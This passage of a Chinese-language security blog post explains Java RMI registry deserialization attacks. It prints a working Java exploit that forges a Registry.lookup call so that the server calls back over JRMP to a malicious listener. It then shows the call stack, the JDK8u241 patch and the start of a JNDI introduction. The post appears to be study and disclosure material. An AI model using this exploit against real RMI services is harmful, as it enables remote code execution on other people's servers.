+ regPort);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 构造要注入的对象：</span></span><br><span class="line">        <span class="comment">//    这里用 UnicastRemoteObject 作为载体，并将其 ssf 置为“远端调用代理”</span></span><br><span class="line">        <span class="comment">//    JRMPListener 地址（ip:port）指向你的恶意服务</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> buildUnicastRemoteObject(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">12233</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 伪造 lookup 调用，将 payload 作为 lookup 的“字符串参数位置”写入</span></span><br><span class="line">        <span class="comment">//    服务器先反序列化（触发副作用）后才尝试强转/校验</span></span><br><span class="line">        lookupInject(registry, payload);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] lookup injection sent.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 伪造一次 Registry.lookup(opnum=2) 调用，把任意对象写入参数流。</span></span><br><span class="line"><span class="comment">     * 服务器端 skeleton 在执行真正的类型检查之前，会先反序列化参数对象。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">lookupInject</span><span class="params">(Registry registry, Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 通过反射从代理对象中取出底层 RemoteRef / interfaceHash / operations</span></span><br><span class="line">        <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span> (RemoteRef) getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">interfaceHash</span> <span class="operator">=</span> toLong(getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>));</span><br><span class="line">        Operation[] operations = (Operation[]) getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造远程调用上下文：opnum=2 即为 Registry 的 lookup</span></span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> ref.newCall((RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// ★ 核心：拿到出站的 ObjectOutput（实际是 sun.rmi.server.MarshalOutputStream）</span></span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 关键步：关闭流级替换（enableReplace=false），否则 Remote 实例会被替换成 stub</span></span><br><span class="line">                <span class="comment">// 字段 enableReplace 是 ObjectOutputStream 的私有字段，这里通过反射写入</span></span><br><span class="line">                setFieldValue(out, <span class="string">&quot;enableReplace&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将“任意对象”写到 lookup 的参数位置（服务端会先反序列化它）</span></span><br><span class="line">                out.writeObject(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="comment">// 参数编组失败 → MarshalException</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 触发远程调用。注意：副作用发生在“服务器端反序列化”阶段，</span></span><br><span class="line">            <span class="comment">// 随后才会因为类型不匹配（期望 String）抛异常。</span></span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br><span class="line">            <span class="comment">// 预期异常（类型不匹配 / 未绑定等）。此时副作用已发生，可按需吞掉</span></span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException || e <span class="keyword">instanceof</span> ClassCastException) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 兜底：未声明的受检异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 结束调用（释放底层资源/连接）</span></span><br><span class="line">            ref.done(call);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造一个 UnicastRemoteObject 实例，并将其 ssf（服务器 Socket 工厂）设为“远端代理”。</span></span><br><span class="line"><span class="comment">     * 反序列化后，UnicastRemoteObject.readObject() 会调用 reexport()，</span></span><br><span class="line"><span class="comment">     * 进而 TCPTransport.listen() → TCPEndpoint.newServerSocket() → ssf.createServerSocket(...)，</span></span><br><span class="line"><span class="comment">     * 由于 ssf 是“远端动态代理”，createServerSocket 的调用会被转发为 JRMP 远程调用，</span></span><br><span class="line"><span class="comment">     * 指向我们构造的 UnicastRef（LiveRef → TCPEndpoint(ip, port)）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">buildUnicastRemoteObject</span><span class="params">(String ip, <span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 随机生成一个 ObjID（远程对象标识）</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造一个到“恶意 JRMP 服务”的 TCP 端点</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(ip, port);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 组装 UnicastRef（持有 LiveRef：包含 ObjID + TCPEndpoint）</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 RemoteObjectInvocationHandler 包裹 UnicastRef</span></span><br><span class="line">        <span class="comment">// 该 handler 会把接口方法调用（如 createServerSocket）转发为 JRMP 调用</span></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 JDK 动态代理生成一个同时实现 RMIServerSocketFactory + Remote 的代理对象</span></span><br><span class="line">        <span class="comment">// 注意：必须包含 Remote 接口，否则 RemoteObjectInvocationHandler.invoke() 会抛异常</span></span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">rmiServerSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">                RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; RMIServerSocketFactory.class, Remote.class &#125;,</span><br><span class="line">                remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射构造 UnicastRemoteObject 实例（不走构造逻辑序列化钩子）</span></span><br><span class="line">        <span class="comment">// getDeclaredConstructor(null) 等价于无参构造器；设置 accessible 以允许调用</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor((Class&lt;?&gt;[]) <span class="literal">null</span>);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) constructor.newInstance((Object[]) <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将反序列化时会使用的“服务器端 socket 工厂（ssf）”字段替换为我们构造的代理</span></span><br><span class="line">        <span class="comment">// 这样在 reexport() → exportObject(..., csf, ssf) 时，会调用 ssf.createServerSocket(...)</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">ssfField</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;ssf&quot;</span>);</span><br><span class="line">        ssfField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ssfField.set(remoteObject, rmiServerSocketFactory);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> remoteObject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在类层次中查找字段（包含父类），并设置 accessible。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getDeclaredField</span><span class="params">(Class&lt;?&gt; clazz, String fieldName)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass(); <span class="comment">// 继续在父类里找</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 未找到</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取对象的私有字段值（向上查找）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object object, String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> getDeclaredField(object.getClass(), fieldName).get(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 写入对象的私有字段值（向上查找）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        getDeclaredField(object.getClass(), fieldName).set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 统一把 Object 转为 long（可能本身是 Long 或字符串）。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">toLong</span><span class="params">(Object v)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Long) <span class="keyword">return</span> (Long) v;</span><br><span class="line">        <span class="keyword">return</span> Long.parseLong(String.valueOf(v));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>注册中心反序列化触发的调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">at java.net.URLStreamHandler.getHostAddress(URLStreamHandler.java:439)</span><br><span class="line">at java.net.URLStreamHandler.hashCode(URLStreamHandler.java:361)</span><br><span class="line">at java.net.URL.hashCode(URL.java:957)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:339)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:1462)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.access$300(ObjectInputStream.java:222)</span><br><span class="line">at java.io.ObjectInputStream$GetFieldImpl.readFields(ObjectInputStream.java:2525)</span><br><span class="line">at java.io.ObjectInputStream.readFields(ObjectInputStream.java:602)</span><br><span class="line">at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:71)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)</span><br><span class="line">at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)</span><br><span class="line">at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161)</span><br><span class="line">at java.rmi.server.RemoteObjectInvocationHandler.invokeRemoteMethod(RemoteObjectInvocationHandler.java:209)</span><br><span class="line">at java.rmi.server.RemoteObjectInvocationHandler.invoke(RemoteObjectInvocationHandler.java:161)</span><br><span class="line">at com.sun.proxy.$Proxy0.createServerSocket(Unknown Source:-1)</span><br><span class="line">at sun.rmi.transport.tcp.TCPEndpoint.newServerSocket(TCPEndpoint.java:666)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.listen(TCPTransport.java:329)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.exportObject(TCPTransport.java:248)</span><br><span class="line">at sun.rmi.transport.tcp.TCPEndpoint.exportObject(TCPEndpoint.java:411)</span><br><span class="line">at sun.rmi.transport.LiveRef.exportObject(LiveRef.java:147)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.exportObject(UnicastServerRef.java:233)</span><br><span class="line">at java.rmi.server.UnicastRemoteObject.exportObject(UnicastRemoteObject.java:470)</span><br><span class="line">at java.rmi.server.UnicastRemoteObject.exportObject(UnicastRemoteObject.java:381)</span><br><span class="line">at java.rmi.server.UnicastRemoteObject.reexport(UnicastRemoteObject.java:303)</span><br><span class="line">at java.rmi.server.UnicastRemoteObject.readObject(UnicastRemoteObject.java:270)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)</span><br><span class="line">at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:109)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:467)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:297)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:800)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:682)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$36.532782046.run(Unknown Source:-1)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)</span><br><span class="line">at java.lang.Thread.run(Thread.java:844)</span><br></pre></td></tr></table></figure></div>

<p>在 JDK8u241 中，这个反序列化利用链被修复。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理真正的远程方法调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Object <span class="title function_">invokeRemoteMethod</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                  Method method,</span></span><br><span class="line"><span class="params">                                  Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 基本校验：代理对象必须实现 Remote（否则不是RMI语义）</span></span><br><span class="line">        <span class="keyword">if</span> (!(proxy <span class="keyword">instanceof</span> Remote)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;proxy not Remote instance&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 【补丁关键点】方法必须声明于“继承了 Remote 的接口”上</span></span><br><span class="line">        <span class="comment">//    ——仅允许远程接口的方法被远程调用</span></span><br><span class="line">        Class&lt;?&gt; decl = method.getDeclaringClass();</span><br><span class="line">        <span class="keyword">if</span> (!Remote.class.isAssignableFrom(decl)) &#123;</span><br><span class="line">            <span class="comment">// 直接拒绝，把问题暴露为 RemoteException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Method is not Remote: &quot;</span> + decl + <span class="string">&quot;::&quot;</span> + method);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 发起远程调用（交给 RemoteRef / UnicastRef 进行编组、网络IO、解组）</span></span><br><span class="line">        <span class="keyword">return</span> ref.invoke((Remote) proxy, method, args, getMethodHash(method));</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在之前的反序列化利用链中，<code>UnicastRemoteObject.readObject()</code> → <code>reexport()</code> → <code>TCPTransport.listen()</code> → <code>TCPEndpoint.newServerSocket()</code>，最终会调用：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssf.createServerSocket(port)</span><br></pre></td></tr></table></figure></div>

<p>我们把 <code>ssf</code> 替换成了<strong>动态代理</strong>（实现了 <code>RMIServerSocketFactory</code> <strong>和</strong> <code>Remote</code>），从而让 <code>RemoteObjectInvocationHandler</code> 把这次调用转成 <strong>JRMP 远程调用</strong>（到恶意 JRMPListener）。</p>
<p><strong>但是</strong> ：<code>createServerSocket</code> 这个方法是<strong>声明在 <code>RMIServerSocketFactory</code> 上的</strong>，而 <code>RMIServerSocketFactory</code> 并不继承 <code>Remote</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个 &#123;<span class="doctag">@code</span> RMIServerSocketFactory&#125; 实例由 RMI 运行时使用，</span></span><br><span class="line"><span class="comment"> * 用于为 RMI 调用创建服务端套接字（ServerSocket）。</span></span><br><span class="line"><span class="comment"> * 当远程对象通过 &#123;<span class="doctag">@code</span> java.rmi.server.UnicastRemoteObject&#125;</span></span><br><span class="line"><span class="comment"> * 或 &#123;<span class="doctag">@code</span> java.rmi.activation.Activatable&#125; 的构造器/ &#123;<span class="doctag">@code</span> exportObject&#125; 方法</span></span><br><span class="line"><span class="comment"> * 被创建/导出时，可以为其关联一个 &#123;<span class="doctag">@code</span> RMIServerSocketFactory&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;与某个远程对象关联的 &#123;<span class="doctag">@code</span> RMIServerSocketFactory&#125; 用于创建</span></span><br><span class="line"><span class="comment"> * 用来接收客户端入站调用的 &#123;<span class="doctag">@code</span> ServerSocket&#125;。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;还可以为远程对象注册表（RMI Registry）关联一个</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> RMIServerSocketFactory&#125;，这样客户端就能以自定义的</span></span><br><span class="line"><span class="comment"> * 套接字通信方式访问注册表。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;该接口的实现类应当重写 &#123;<span class="doctag">@link</span> Object#equals&#125;：</span></span><br><span class="line"><span class="comment"> * 当传入的实例在功能上等价（表示相同/等效的服务器套接字工厂配置）时返回 &#123;<span class="doctag">@code</span> true&#125;，</span></span><br><span class="line"><span class="comment"> * 否则返回 &#123;<span class="doctag">@code</span> false&#125;；并保证 &#123;<span class="doctag">@link</span> Object#hashCode&#125; 与</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> equals&#125; 的实现一致。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  Ann Wollrath</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  Peter Jones</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>     java.rmi.server.UnicastRemoteObject</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>     java.rmi.activation.Activatable</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span>     java.rmi.registry.LocateRegistry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIServerSocketFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在指定端口上创建一个服务端套接字（端口 0 表示使用匿名端口，由操作系统自动分配）。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  port 端口号</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 在指定端口上创建的 &#123;<span class="doctag">@code</span> ServerSocket&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException 如果在创建 &#123;<span class="doctag">@code</span> ServerSocket&#125; 的过程中发生 I/O 错误</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ServerSocket <span class="title function_">createServerSocket</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>补丁把“<strong>多接口动态代理</strong>”这条绕路堵上了——只能远调“<strong>真正的远程接口方法</strong>”，不能借“顺手实现 Remote”来把<strong>非远程接口的方法</strong>（比如 <code>RMIServerSocketFactory#createServerSocket</code>）也塞进 JRMP 去执行&#x2F;回包反序列化。</p>
<h1 id="JNDI（Java-Naming-and-Directory-Interface）"><a href="#JNDI（Java-Naming-and-Directory-Interface）" class="headerlink" title="JNDI（Java Naming and Directory Interface）"></a>JNDI（Java Naming and Directory Interface）</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="什么是-JNDI？"><a href="#什么是-JNDI？" class="headerlink" title="什么是 JNDI？"></a>什么是 JNDI？</h3><p><strong>JNDI（Java Naming and Directory Interface）</strong> 是 Java 标准库提供的<strong>统一 API</strong>，用于访问各种<strong>命名&#x2F;目录服务</strong>。</p>
<p>通俗讲：<strong>JNDI 就是“按名字找资源”的统一入口</strong>。常见场景包括：</p>
<ul>
<li>在应用服务器中按名查找 <strong>DataSource</strong>（再用 JDBC 访问数据库）</li>
<li>访问 <strong>LDAP</strong> 目录服务（查询&#x2F;搜索带属性的条目）</li>
<li>连接 <strong>RMI Registry</strong> 查找远程对象</li>
